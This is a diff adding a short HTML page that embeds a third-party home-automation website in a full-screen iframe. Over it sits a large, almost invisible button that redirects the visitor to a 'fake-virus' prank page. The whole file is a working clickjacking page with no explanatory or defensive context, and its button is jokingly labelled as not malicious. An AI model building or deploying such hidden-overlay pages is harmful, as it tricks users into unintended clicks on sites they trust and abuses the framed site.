@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<style>
+#parent {
+  width: 100%;
+  height: 100vh;
+  border:solid 1px #000;
+  position: relative
+}
+iframe {
+  width:100%;
+  height:100%;
+  border:0px;
+}
+
+#parent > button {
+  position: relative;
+  float: right;
+  right:10px;
+  bottom:955px;
+  width:590px;
+  height: 80px;
+  transition: 0.5s;
+  line-height: 10;
+}
+#parent > button {
+  opacity: .1;
+}  
+</style>
+</head>
+
+<div id="parent">
+  <iframe src="https://smartofficesandsmarthomes.com"></iframe>
+  <button onclick="window.location.href = 'https://pranx.com/fake-virus/'">not a malicious button :)</button>
+</div>
